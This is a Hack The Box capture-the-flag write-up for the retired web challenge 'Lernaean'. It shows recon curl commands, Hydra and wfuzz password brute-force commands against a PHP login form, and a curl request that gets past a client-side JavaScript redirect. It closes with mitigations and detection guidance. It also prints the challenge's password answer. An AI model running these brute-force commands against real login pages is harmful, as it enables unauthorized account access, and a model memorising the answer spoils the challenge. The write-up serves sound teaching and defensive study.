---
challenge: Lernaean
category: Challenge
type: Web
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, hydra, brute-force, client-side, php]
---

# Lernaean — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired according to the historical challenge index and public writeups; not verified with an HTB session.
> No real flags.

## TL;DR

A login form with the hint "Try and guess their password". The challenge name points at the Lernaean Hydra: brute-force the `POST` with **Hydra** and the password `leonardo` appears. The browser redirects to `noooooooope.html` through JavaScript, but the original `POST` response already contains the marker; `curl` does not run the redirect and reads the body.

## Statement and surface

- Category **Web**, difficulty **Easy**.
- A single page with a username and password form.
- The hint invites password guessing; there is no registration or recovery.
- The challenge runs in a container with its own host and port (`<HOST>:<PORT>`).

## Recon

```bash
curl -s -i http://<HOST>:<PORT>/ | head -40
curl -s http://<HOST>:<PORT>/ | grep -iE 'form|input|script|hint'
```

The HTML shows a `POST` to `index.php` with `username` and `password`. The error page returns `Invalid password!`; that string is Hydra's failure condition. There is no CSRF token or visible rate limit.

```bash
curl -s -X POST http://<HOST>:<PORT>/ \
  -d 'username=user&password=test' | tail -20
```

## Root cause

The application checks the password on the server but does not limit attempts. Its "brute-force protection" is **client-side JavaScript**: on a correct password, the script redirects to `noooooooope.html` ("Too slow!"). The server has already returned the response with the marker before the browser runs the redirect. A client that does not execute JavaScript, such as `curl`, sees the original body.

This is not a cryptographic bypass: it is a client-side check on a response that already left the server.

## Exploitation

### Hydra

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt \
  -s <PORT> <HOST> http-post-form \
  "/index.php:username=^USER^&password=^PASS^:Invalid password!"
```

If the username is unknown, try `admin` or let the form validate it; in the original challenge the account is `user`. Hydra finds the password `leonardo`.

`wfuzz` alternative:

```bash
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt \
  -d 'username=user&password=FUZZ' --hw=<WORDS> \
  http://<HOST>:<PORT>/index.php
```

`--hw` filters by the word count of the failure response; measure it first with an invalid request.

### Avoid the client-side redirect

```bash
curl -s -X POST http://<HOST>:<PORT>/ \
  -d 'username=user&password=leonardo'
```

The response contains the challenge marker. In a browser, JavaScript redirects to `noooooooope.html`; disable JavaScript, intercept the response, or repeat the request with `curl`.

The flag is not published: the point is the method and bypassing the client-side check.

## Evidence

- Form and the `Invalid password!` error.
- Hydra with the recovered password.
- `curl` showing the body of the successful `POST`.
- Client-side redirect to `noooooooope.html`, no flag.

## Lessons learned

- A JavaScript redirect is not an access control: the response is already on the client.
- The error string is Hydra's condition; without it, filter by size or status code.
- `rockyou` still works for old challenge passwords, but the method matters more than the list.
- The name hint ("Lernaean Hydra") is part of the challenge: it identifies the tool.
- A server-side rate limit would change the attack; a client-side redirect does not.

## Mitigations and detection

- Rate-limit attempts per account and IP, with backoff and temporary lockout; never rely on JavaScript for security.
- Return a generic error and do not include the marker or sensitive data before authorization.
- Log authentication failures and alert on bursts (for example, repeated 401/403 or mass `POST`s to `index.php`).
- Use strong passwords and MFA; brute force then stops being enough.
- MITRE: T1110.001 (password guessing), T1110.003 (password spraying) as a variant.
- References: sequr.be and Bug Decoder writeups; Hydra documentation.

## References

- <https://sequr.be/blog/2019/08/lernaean>
- <https://medium.com/bugdecoder/htb-lernaean-web-challenge-write-up-2994c7ba7244>
- <https://jebidiah-anthony.github.io/chals/htb/challenges.html>
